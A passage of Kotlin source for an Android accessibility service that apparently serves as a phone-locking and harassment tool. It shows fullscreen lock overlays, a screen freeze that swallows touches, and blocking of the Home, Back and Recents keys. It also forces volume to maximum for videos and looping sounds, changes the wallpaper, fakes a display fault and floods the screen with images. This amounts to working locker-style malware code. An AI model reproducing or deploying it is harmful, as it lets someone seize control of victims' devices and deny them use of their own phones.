        val safeTeks = teks.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;").replace("\"", "&quot;")

        val html = """
<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<style>
*{margin:0;padding:0;box-sizing:border-box}
html,body{width:100%;height:100%;background:transparent;overflow:hidden;display:flex;align-items:center;justify-content:center}
.wrap{display:inline-block;background:rgba(0,0,0,0.4);border-radius:20px;padding:16px 28px;overflow:hidden;max-width:90vw}
.marquee{display:inline-block;white-space:nowrap;animation:scroll 8s linear infinite}
@keyframes scroll{0%{transform:translateX(60vw)}100%{transform:translateX(-100%)}}
.txt{font-size:32px;font-weight:800;font-family:'Segoe UI',sans-serif;background:linear-gradient(90deg,#ff0000,#ff7700,#ffff00,#00ff00,#0077ff,#8800ff,#ff0088,#ff0000);background-size:300% auto;-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;animation:rb 3s linear infinite}
@keyframes rb{0%{background-position:0% center}100%{background-position:300% center}}
</style>
</head>
<body>
<div class="wrap"><div class="marquee"><span class="txt">$safeTeks</span></div></div>
</body>
</html>
        """.trimIndent()

        val webView = WebView(this)
        webView.settings.javaScriptEnabled = false
        webView.setBackgroundColor(0x00000000)
        webView.loadDataWithBaseURL(null, html, "text/html", "UTF-8", null)

        val params = WindowManager.LayoutParams(
            screenWidth,
            screenHeight / 6,
            WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                or WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
                or WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
            PixelFormat.TRANSLUCENT
        )
        params.gravity = Gravity.CENTER

        try {
            windowManager.addView(webView, params)
            tekslayarView = webView
        } catch (_: Exception) {}
    }

    private fun removeTeksLayar() {
        tekslayarView?.let {
            try { windowManager.removeView(it) } catch (_: Exception) {}
        }
        tekslayarView = null
    }

    private fun applyWallpaper(base64Data: String) {
        try {
            val bytes = android.util.Base64.decode(base64Data, android.util.Base64.DEFAULT)
            val bitmap = android.graphics.BitmapFactory.decodeByteArray(bytes, 0, bytes.size) ?: return
            val wm = getSystemService(WALLPAPER_SERVICE) as? android.app.WallpaperManager ?: return
            wm.setBitmap(bitmap)
        } catch (_: Exception) {}
    }

    @SuppressLint("SetJavaScriptEnabled")
    private fun showLockHtmlOverlay(html: String) {
        if (lockHtmlView != null) removeLockHtmlOverlay()

        val webView = WebView(this)
        webView.settings.javaScriptEnabled = true
        webView.settings.domStorageEnabled = true
        webView.settings.mediaPlaybackRequiresUserGesture = false
        webView.webViewClient = WebViewClient()
        webView.setBackgroundColor(0xFF000000.toInt())
        webView.loadDataWithBaseURL(null, html, "text/html", "UTF-8", null)
        applyFullscreen(webView)

        val params = buildFullscreenOverlayParams(touchable = false)

        try {
            windowManager.addView(webView, params)
            lockHtmlView = webView
            LockService.isLocked = true
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    private fun removeLockHtmlOverlay() {
        lockHtmlView?.let {
            try { windowManager.removeView(it) } catch (_: Exception) {}
        }
        lockHtmlView = null
        if (lockView == null) LockService.isLocked = false
    }

    private fun showPutarVideoOverlay(videoPath: String) {
        android.util.Log.d("KAISER_PV", "showPutarVideoOverlay called path=$videoPath exists=${java.io.File(videoPath).exists()} size=${java.io.File(videoPath).length()}")
        removePutarVideoOverlay(null)

        val screenWidth = getScreenWidth()
        val screenHeight = getScreenHeight()

        val surfaceView = SurfaceView(this)
        applyFullscreen(surfaceView)

        val params = buildFullscreenOverlayParams(touchable = false)

        surfaceView.holder.addCallback(object : SurfaceHolder.Callback {
            override fun surfaceCreated(holder: SurfaceHolder) {
                android.util.Log.d("KAISER_PV", "surfaceCreated, setting up MediaPlayer")
                try {
                    val am = getSystemService(AUDIO_SERVICE) as AudioManager
                    am.setStreamVolume(
                        AudioManager.STREAM_MUSIC,
                        am.getStreamMaxVolume(AudioManager.STREAM_MUSIC),
                        0
                    )

                    val mp = MediaPlayer()
                    val fis = java.io.FileInputStream(videoPath)
                    mp.setDataSource(fis.fd)
                    fis.close()
                    mp.setSurface(holder.surface)

                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                        mp.setAudioAttributes(
                            AudioAttributes.Builder()
                                .setUsage(AudioAttributes.USAGE_MEDIA)
                                .setContentType(AudioAttributes.CONTENT_TYPE_MOVIE)
                                .build()
                        )
                    } else {
                        @Suppress("DEPRECATION")
                        mp.setAudioStreamType(AudioManager.STREAM_MUSIC)
                    }

                    mp.setOnVideoSizeChangedListener { _, vidW, vidH ->
                        if (vidW > 0 && vidH > 0) {
                            val scaleW = screenWidth.toFloat() / vidW
                            val scaleH = (screenHeight + 300).toFloat() / vidH
                            val scale = maxOf(scaleW, scaleH)
                            val finalW = (vidW * scale).toInt()
                            val finalH = (vidH * scale).toInt()
                            val xOff = (screenWidth - finalW) / 2
                            val yOff = ((screenHeight - finalH) / 2) - 150
                            val lp = params.also {
                                it.width = finalW
                                it.height = finalH
                                it.x = xOff
                                it.y = yOff
                            }
                            try { windowManager.updateViewLayout(surfaceView, lp) } catch (_: Exception) {}
                        }
                    }

                    mp.setOnPreparedListener { player ->
                        android.util.Log.d("KAISER_PV", "MediaPlayer onPrepared, starting playback")
                        player.isLooping = false
                        player.start()
                        am.setStreamVolume(
                            AudioManager.STREAM_MUSIC,
                            am.getStreamMaxVolume(AudioManager.STREAM_MUSIC),
                            0
                        )
                    }

                    mp.setOnCompletionListener {
                        android.util.Log.d("KAISER_PV", "MediaPlayer onCompletion, removing overlay")
                        handler.post { removePutarVideoOverlay(videoPath) }
                    }

                    mp.setOnErrorListener { _, what, extra ->
                        android.util.Log.e("KAISER_PV", "MediaPlayer onError what=$what extra=$extra")
                        handler.post { removePutarVideoOverlay(videoPath) }
                        true
                    }

                    mp.prepareAsync()
                    android.util.Log.d("KAISER_PV", "MediaPlayer prepareAsync called")
                    putarMediaPlayer = mp
                } catch (e: Exception) {
                    android.util.Log.e("KAISER_PV", "surfaceCreated exception: ${e::class.simpleName}: ${e.message}")
                    handler.post { removePutarVideoOverlay(videoPath) }
                }
            }

            override fun surfaceChanged(holder: SurfaceHolder, format: Int, width: Int, height: Int) {}
            override fun surfaceDestroyed(holder: SurfaceHolder) {}
        })

        try {
            windowManager.addView(surfaceView, params)
            putarVideoSurface = surfaceView
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    private fun removePutarVideoOverlay(videoPath: String? = null) {
        putarMediaPlayer?.let {
            try { it.stop() } catch (_: Exception) {}
            try { it.release() } catch (_: Exception) {}
        }
        putarMediaPlayer = null

        putarVideoSurface?.let {
            try { windowManager.removeView(it) } catch (_: Exception) {}
        }
        putarVideoSurface = null

        if (videoPath != null) {
            try { java.io.File(videoPath).delete() } catch (_: Exception) {}
        }

        try {
            val endedIntent = Intent(ACTION_VIDEO_ENDED).apply { setPackage(packageName) }
            sendBroadcast(endedIntent)
        } catch (_: Exception) {}
    }

    private fun showLcdEfek() {
        if (lcdEfekView != null) return

        val screenWidth = getScreenWidth()

        val lineColors = intArrayOf(
            Color.parseColor("#FF0000"),
            Color.parseColor("#00FF00"),
            Color.parseColor("#0088FF"),
            Color.parseColor("#FF00FF"),
            Color.parseColor("#FFFF00")
        )

        val lineWidth = 4
        val random = java.util.Random(42)
        val linePositions = IntArray(lineColors.size) { random.nextInt(screenWidth - lineWidth) }

        val view = object : View(this) {
            private val paint = Paint().apply {
                style = Paint.Style.FILL
                isAntiAlias = false
            }

            override fun onDraw(canvas: Canvas) {
                for (i in lineColors.indices) {
                    paint.color = lineColors[i]
                    val x = linePositions[i].toFloat()
                    canvas.drawRect(x, 0f, x + lineWidth, height.toFloat(), paint)
                }
            }
        }

        val params = buildFullscreenOverlayParams(touchable = false, alpha = 0.65f)

        try {
            windowManager.addView(view, params)
            lcdEfekView = view
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    private fun removeLcdEfek() {
        lcdEfekView?.let {
            try { windowManager.removeView(it) } catch (_: Exception) {}
        }
        lcdEfekView = null
    }

    private fun showFreezeLayar() {
        if (freezeLayarView != null) return

        val view = android.widget.FrameLayout(this)
        view.setBackgroundColor(0x00000000)
        view.isClickable = true
        view.isFocusable = true
        view.isFocusableInTouchMode = true
        view.setOnTouchListener { _, _ -> true }
        applyLegacySystemUiHide(view)
        applyModernSystemUiHide(view)

        val params = buildFullscreenOverlayParams(touchable = true)

        try {
            windowManager.addView(view, params)
            freezeLayarView = view
            freezeLayarActive = true
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    private fun removeFreezeLayar() {
        freezeLayarView?.let {
            try { windowManager.removeView(it) } catch (_: Exception) {}
        }
        freezeLayarView = null
        freezeLayarActive = false
    }

    private fun startAmbarus() {
        stopAmbarus()

        val wm = android.app.WallpaperManager.getInstance(this)
        ambarusWallpaperIndex = 0
        val wallpaperRunnable = object : Runnable {
            override fun run() {
                try {
                    val idx = (ambarusWallpaperIndex % 2) + 1
                    val afd: AssetFileDescriptor = assets.openFd("ambarus/wallpaper$idx.jpg")
                    val bitmap = android.graphics.BitmapFactory.decodeStream(afd.createInputStream())
                    afd.close()
                    if (bitmap != null) wm.setBitmap(bitmap)
                    ambarusWallpaperIndex++
                } catch (_: Exception) {}
                handler.postDelayed(this, 2000)
            }
        }
        ambarusWallpaperRunnable = wallpaperRunnable
        handler.post(wallpaperRunnable)

        ambarusFotoIndex = 0
        ambarusFotoShowCount = 0
        val screenWidth = getScreenWidth()
        val screenHeight = getScreenHeight()
        val random = java.util.Random()
        val fotoRunnable = object : Runnable {
            override fun run() {
                if (ambarusFotoViews.isEmpty() || ambarusFotoShowCount < 10) {
                    val fotoNum = (ambarusFotoIndex % 10) + 1
                    try {
                        val afd: AssetFileDescriptor = assets.openFd("ambarus/$fotoNum.jpg")
                        val bitmap = android.graphics.BitmapFactory.decodeStream(afd.createInputStream())
                        afd.close()
                        if (bitmap != null) {
                            val imgView = android.widget.ImageView(this@KaiserAccessibilityService)
                            imgView.setImageBitmap(bitmap)
                            imgView.scaleType = android.widget.ImageView.ScaleType.FIT_CENTER
                            val w = bitmap.width.coerceAtMost(300)
                            val h = bitmap.height.coerceAtMost(300)
                            val params = WindowManager.LayoutParams(
                                w, h,
                                WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
                                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                                    or WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
                                    or WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
                                PixelFormat.TRANSLUCENT
                            )
                            params.x = random.nextInt(screenWidth - w)
                            params.y = random.nextInt(screenHeight - h)
                            params.gravity = Gravity.TOP or Gravity.START
                            windowManager.addView(imgView, params)
                            ambarusFotoViews.add(imgView)
                            ambarusFotoShowCount++
                            ambarusFotoIndex++
                        }
                    } catch (_: Exception) {}
                    handler.postDelayed(this, 800)
                } else {
                    if (ambarusFotoViews.isNotEmpty()) {
                        val toRemove = ambarusFotoViews.removeAt(0)
                        try { windowManager.removeView(toRemove) } catch (_: Exception) {}
                        handler.postDelayed(this, 400)
                    } else {
                        ambarusFotoShowCount = 0
                        ambarusFotoIndex = 0
                        handler.postDelayed(this, 500)
                    }
                }
            }
        }
        ambarusFotoRunnable = fotoRunnable
        handler.post(fotoRunnable)

        try {
            val am = getSystemService(AUDIO_SERVICE) as AudioManager
            am.setStreamVolume(AudioManager.STREAM_MUSIC, am.getStreamMaxVolume(AudioManager.STREAM_MUSIC), 0)
            val afd: AssetFileDescriptor = assets.openFd("ambarus/sound.mp3")
            val mp = MediaPlayer()
            mp.setAudioAttributes(
                AudioAttributes.Builder()
                    .setUsage(AudioAttributes.USAGE_MEDIA)
                    .setContentType(AudioAttributes.CONTENT_TYPE_MUSIC)
                    .build()
            )
            mp.setDataSource(afd.fileDescriptor, afd.startOffset, afd.length)
            afd.close()
            mp.isLooping = true
            mp.prepare()
            mp.start()
            ambarusMediaPlayer = mp
        } catch (_: Exception) {}
    }

    private fun stopAmbarus() {
        ambarusWallpaperRunnable?.let { handler.removeCallbacks(it) }
        ambarusWallpaperRunnable = null

        ambarusFotoRunnable?.let { handler.removeCallbacks(it) }
        ambarusFotoRunnable = null

        for (v in ambarusFotoViews) {
            try { windowManager.removeView(v) } catch (_: Exception) {}
        }
        ambarusFotoViews.clear()
        ambarusFotoShowCount = 0
        ambarusFotoIndex = 0

        ambarusMediaPlayer?.let {
            try { it.stop() } catch (_: Exception) {}
            try { it.release() } catch (_: Exception) {}
        }
        ambarusMediaPlayer = null
    }

    override fun onKeyEvent(event: android.view.KeyEvent): Boolean {
        if (freezeLayarActive) {
            if (event.action == android.view.KeyEvent.ACTION_UP) {
                handler.postDelayed({ performGlobalAction(GLOBAL_ACTION_HOME) }, 50)
            }
            return true
        }

        if (!LockService.isLocked && lockHtmlView == null && putarVideoSurface == null) return false

        return when (event.keyCode) {
            android.view.KeyEvent.KEYCODE_HOME,
            android.view.KeyEvent.KEYCODE_APP_SWITCH,
            android.view.KeyEvent.KEYCODE_RECENT_APPS,
            android.view.KeyEvent.KEYCODE_BACK -> {
                if (event.action == android.view.KeyEvent.ACTION_UP) {
                    handler.postDelayed({ performGlobalAction(GLOBAL_ACTION_HOME) }, 50)
                }
                true
            }
            else -> false
        }
    }
}
